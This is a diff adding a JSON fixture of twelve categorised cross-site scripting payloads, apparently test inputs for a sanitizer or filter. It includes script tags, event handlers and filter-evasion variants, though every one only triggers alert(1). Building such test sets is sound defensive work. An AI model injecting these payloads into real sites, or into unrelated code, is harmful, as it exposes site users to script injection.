@@ -1,0 +1,14 @@
+[
+  {"id": "XSS-T01", "category": "tag", "payload": "<script>alert(1)</script>"},
+  {"id": "XSS-T02", "category": "tag", "payload": "<svg onload=alert(1)>"},
+  {"id": "XSS-T03", "category": "tag", "payload": "<iframe src=javascript:alert(1)>"},
+  {"id": "XSS-E01", "category": "event-handler", "payload": "<img src=x onerror=alert(1)>"},
+  {"id": "XSS-E02", "category": "event-handler", "payload": "<body onload=alert(1)>"},
+  {"id": "XSS-E03", "category": "event-handler", "payload": "<input onfocus=alert(1) autofocus>"},
+  {"id": "XSS-C01", "category": "case-obfuscation", "payload": "<ScRiPt>alert(1)</sCriPt>"},
+  {"id": "XSS-C02", "category": "case-obfuscation", "payload": "<IMG SRC=x ONERROR=alert(1)>"},
+  {"id": "XSS-N01", "category": "no-script-tag", "payload": "<a href=javascript:alert(1)>click</a>"},
+  {"id": "XSS-N02", "category": "no-script-tag", "payload": "<details open ontoggle=alert(1)>"},
+  {"id": "XSS-B01", "category": "broken-tag", "payload": "<<script>alert(1)//<</script>"},
+  {"id": "XSS-B02", "category": "broken-tag", "payload": "<scr<script>ipt>alert(1)</scr</script>ipt>"}
+]
